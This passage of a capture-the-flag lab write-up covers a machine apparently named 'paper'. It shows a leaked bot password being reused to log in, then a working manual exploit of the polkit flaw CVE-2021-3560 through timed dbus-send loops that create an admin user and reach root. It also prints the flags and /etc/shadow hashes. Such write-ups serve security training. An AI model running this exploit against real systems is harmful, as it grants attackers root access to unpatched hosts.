<span id="cb5-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span> 12 dwight dwight 4096 Feb 14 15:17 ..</span>
<span id="cb5-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 dwight dwight 27 Sep 15 13:03 sale</span>
<span id="cb5-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 dwight dwight 27 Jul 3 2021 sale_2</span>
<span id="cb5-8"></span>
<span id="cb5-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> list sale</span>
<span id="cb5-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Fetching</span> the directory listing of sale</span>
<span id="cb5-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 4</span>
<span id="cb5-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 dwight dwight 27 Sep 15 13:03 .</span>
<span id="cb5-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 4 dwight dwight 32 Jul 3 2021 ..</span>
<span id="cb5-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 dwight dwight 158 Sep 15 13:03 portfolio.txt</span>
<span id="cb5-15"></span>
<span id="cb5-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> file sale/portfolio.txt</span>
<span id="cb5-17"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!=====Contents <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">of</span> file sale/portfolio.txt=====<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb5-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Portfolio</span></span>
<span id="cb5-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">----------</span></span>
<span id="cb5-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> Bill</span>
<span id="cb5-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> Served the country in war</span>
<span id="cb5-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> Family built the country</span>
<span id="cb5-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> purchased paper worth a million dollars</span>
<span id="cb5-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> will probably fire me.</span>
<span id="cb5-25"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!=====End <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">of</span> file sale/portfolio.txt=====<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb5-26"></span>
<span id="cb5-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> list sale_2</span>
<span id="cb5-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 4</span>
<span id="cb5-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 dwight dwight 27 Jul 3 2021 .</span>
<span id="cb5-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 4 dwight dwight 32 Jul 3 2021 ..</span>
<span id="cb5-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 dwight dwight 113 Jul 3 2021 portfolio.txt</span>
<span id="cb5-32"></span>
<span id="cb5-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> file sale_2/portfolio.txt</span>
<span id="cb5-34"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!=====Contents <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">of</span> file sale_2/portfolio.txt=====<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb5-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Portfolio</span></span>
<span id="cb5-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">----------</span></span>
<span id="cb5-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> Christian</span>
<span id="cb5-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> Still No idea how micheal made the sale!</span>
<span id="cb5-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> Need further clarifications.</span>
<span id="cb5-40"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!=====End <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">of</span> file sale_2/portfolio.txt=====<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb5-41"></span>
<span id="cb5-42"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> list ../</span>
<span id="cb5-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Fetching</span> the directory listing of ../</span>
<span id="cb5-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 76</span>
<span id="cb5-45"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span> 12 dwight dwight 4096 Feb 14 15:17 .</span>
<span id="cb5-46"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x.</span> 3 root root 20 Feb 14 15:22 ..</span>
<span id="cb5-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lrwxrwxrwx</span> 1 dwight dwight 9 Jul 3 2021 .bash_history <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /dev/null</span>
<span id="cb5-48"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 dwight dwight 18 May 10 2019 .bash_logout</span>
<span id="cb5-49"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 dwight dwight 141 May 10 2019 .bash_profile</span>
<span id="cb5-50"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 dwight dwight 358 Jul 3 2021 .bashrc</span>
<span id="cb5-51"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span> 2 dwight dwight 34 Feb 13 11:05 bin</span>
<span id="cb5-52"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxr-xr-x</span> 1 dwight dwight 1219 Feb 13 11:07 bot_restart.sh</span>
<span id="cb5-53"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dwight dwight 9627 Feb 14 14:04 bumble.sh</span>
<span id="cb5-54"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span> 5 dwight dwight 56 Jul 3 2021 .config</span>
<span id="cb5-55"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-------</span> 1 dwight dwight 16 Jul 3 2021 .esd_auth</span>
<span id="cb5-56"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span> 1 dwight dwight 2434 Feb 14 08:05 exploit.py</span>
<span id="cb5-57"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxrwxr-x</span> 1 dwight dwight 9628 Feb 14 07:50 exploit.sh</span>
<span id="cb5-58"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span> 3 dwight dwight 69 Feb 14 11:00 .gnupg</span>
<span id="cb5-59"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span> 8 dwight dwight 4096 Sep 16 07:57 hubot</span>
<span id="cb5-60"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span> 1 dwight dwight 18 Sep 16 07:24 .hubot_history</span>
<span id="cb5-61"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-------</span> 1 dwight dwight 36 Feb 14 11:12 .lesshst</span>
<span id="cb5-62"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span> 4 dwight dwight 30 Feb 13 10:25 .local</span>
<span id="cb5-63"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 4 dwight dwight 39 Jul 3 2021 .mozilla</span>
<span id="cb5-64"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span> 5 dwight dwight 83 Jul 3 2021 .npm</span>
<span id="cb5-65"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span> 1 dwight dwight 0 Feb 14 15:21 root.txt</span>
<span id="cb5-66"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 4 dwight dwight 32 Jul 3 2021 sales</span>
<span id="cb5-67"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwx------</span> 2 dwight dwight 6 Sep 16 08:56 .ssh</span>
<span id="cb5-68"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-r--------</span> 1 dwight dwight 33 Feb 13 00:40 user.txt</span>
<span id="cb5-69"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 dwight dwight 24 Sep 16 07:09 .vim</span>
<span id="cb5-70"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-------</span> 1 dwight dwight 1757 Feb 14 15:17 .viminfo</span>
<span id="cb5-71"></span>
<span id="cb5-72"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">$</span> file ../hubot/.env</span>
<span id="cb5-73"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!=====Contents <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">of</span> file ../hubot/.env=====<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb5-74"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">export</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">ROCKETCHAT_URL</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'http://127.0.0.1:48320'</span></span>
<span id="cb5-75"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">export</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">ROCKETCHAT_USER</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>recyclops</span>
<span id="cb5-76"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">export</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">ROCKETCHAT_PASSWORD</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>Queenofblad3s!23</span>
<span id="cb5-77"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">export</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">ROCKETCHAT_USESSL</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>false</span>
<span id="cb5-78"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">export</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">RESPOND_TO_DM</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>true</span>
<span id="cb5-79"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">export</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">RESPOND_TO_EDITED</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>true</span>
<span id="cb5-80"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">export</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">PORT</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>8000</span>
<span id="cb5-81"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">export</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">BIND_ADDRESS</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>127.0.0.1</span>
<span id="cb5-82"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>!=====End <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">of</span> file ../hubot/.env=====<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>Login with found credentials: <code>dwight:Queenofblad3s!23</code></p>
<p>Grab user.txt</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[dwight@paper</span> ~]$ cat user.txt </span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">c08f19a9c33103d08cc0273fda6e8497</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<ul>
<li><code>dwight</code> is not able to run commands as <code>sudo</code>.</li>
</ul>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[dwight@paper</span> tmp]$ netstat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-antp</span></span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span>
<span id="cb7-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 0.0.0.0:22              0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:48320         0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb7-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:8000          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      2395/node           </span>
<span id="cb7-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:33060         0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb7-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:27017         0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb7-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:3306          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> </span></code></pre></div>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">./linpeas.sh</span></span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">╔══════════╣</span> Sudo version</span>
<span id="cb8-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">╚</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version</span>
<span id="cb8-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sudo</span> version 1.8.29</span>
<span id="cb8-6"></span>
<span id="cb8-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Vulnerable</span> to CVE-2021-3560</span></code></pre></div>
<p>Google for <code>cve-2021-3560 github</code> and we find a lot of POCs, download one and try it out. The exploit will work as intended, a user is created, however we are not able to login as that user. Instead, try to exploit it manually.</p>
<blockquote class="blockquote">
<p>“To avoid repeatedly triggering the authentication dialog box (which can be annoying), I recommend running the commands from an SSH session”</p>
</blockquote>
<p><strong>Manual exploit of CVE-2021-3560:</strong></p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[dwight@paper</span> shm]$ ssh localhost</span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dwight@localhosts</span> password: Queenofblad3s!23</span>
<span id="cb9-3"></span>
<span id="cb9-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[dwight@paper</span> shm]$ time dbus-send <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--system</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dest</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>org.freedesktop.Accounts <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>method_call <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--print-reply</span> /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1</span>
<span id="cb9-5"></span>
<span id="cb9-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">real</span>    0m0.007s</span>
<span id="cb9-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user</span>    0m0.003s</span>
<span id="cb9-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sys</span> 0m0.003s</span>
<span id="cb9-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[dwight@paper</span> shm]$ time dbus-send <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--system</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dest</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>org.freedesktop.Accounts <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>method_call <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--print-reply</span> /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1</span>
<span id="cb9-10"></span>
<span id="cb9-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">real</span>    0m0.006s</span>
<span id="cb9-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user</span>    0m0.001s</span>
<span id="cb9-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sys</span> 0m0.004s</span>
<span id="cb9-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[dwight@paper</span> shm]$ time dbus-send <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--system</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dest</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>org.freedesktop.Accounts <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>method_call <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--print-reply</span> /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1</span>
<span id="cb9-15"></span>
<span id="cb9-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">real</span>    0m0.007s</span>
<span id="cb9-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">user</span>    0m0.002s</span>
<span id="cb9-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sys</span> 0m0.004s</span></code></pre></div>
<p>The time is around 6-7 milliseconds, meaning we need to kill the <code>dbus-send</code> command after approximately 3 milliseconds.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[dwight@paper</span> shm]$ for i in <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">..</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">50</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">do</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dbus-send</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--system</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dest</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>org.freedesktop.Accounts <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>method_call <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--print-reply</span> /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:playerthree string:”PlayerThree” int32:1 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sleep</span> 0.003s <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">kill</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$!</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">done</span></span>
<span id="cb10-2"></span>
<span id="cb10-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[dwight@paper</span> shm]$ id playerthree</span>
<span id="cb10-4"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1005<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">playerthree</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1005<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">playerthree</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1005<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">playerthree</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,10</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wheel</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-5"></span>
<span id="cb10-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[dwight@paper</span> shm]$ for i in <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">..</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">50</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">do</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dbus-send</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--system</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dest</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>org.freedesktop.Accounts <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--type</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>method_call <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--print-reply</span> /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string: string:GoldenEye <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sleep</span> 0.003s <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">kill</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$!</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">done</span></span>
<span id="cb10-7"></span>
<span id="cb10-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[dwight@paper</span> shm]$ su playerthree <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'sudo su'</span></span>
<span id="cb10-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password:</span> </span>
<span id="cb10-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[root@paper</span> shm]# id</span>
<span id="cb10-11"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb10-12"></span>
<span id="cb10-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[root@paper</span> shm]# cat /root/root.txt</span>
<span id="cb10-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2db764e7dc2b0a27f33844524930ab83</span></span>
<span id="cb10-15"></span>
<span id="cb10-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[root@paper</span> shm]# cat /etc/shadow</span>
<span id="cb10-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$rfCS6Tb3sgIjkTux$UhBHq5wWPncgtVnltzm3Squ9KBcX3</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/9k0y6o8AG6lNSKOobHatUWFzPS1J8uuh/QML6kyhZ10ngXa5nCBLDkL.:18811:0:99999:7:::</span></span>
<span id="cb10-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dwight:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$6$xVlcDig</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.sohk9jK0</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$BZEhwP6SZytZTTAMTqjb35j02yMHq</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/F4jl3WPwqFCtsf0Cbce4pqo3PS8OGXiJdXGE/C4Y4yQZAmiT60wt9OQ/:18811:0:99999:7:::</span></span>
<span id="cb10-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">playerthree::19039:0:99999:7:::</span></span></code></pre></div>
<p><strong>NOTE:</strong> When creating the password, it must be set to blank else it wont work.</p>
<p>A very simple bash script that does it all for you:</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="ex" style="color: null;
background-color: null;
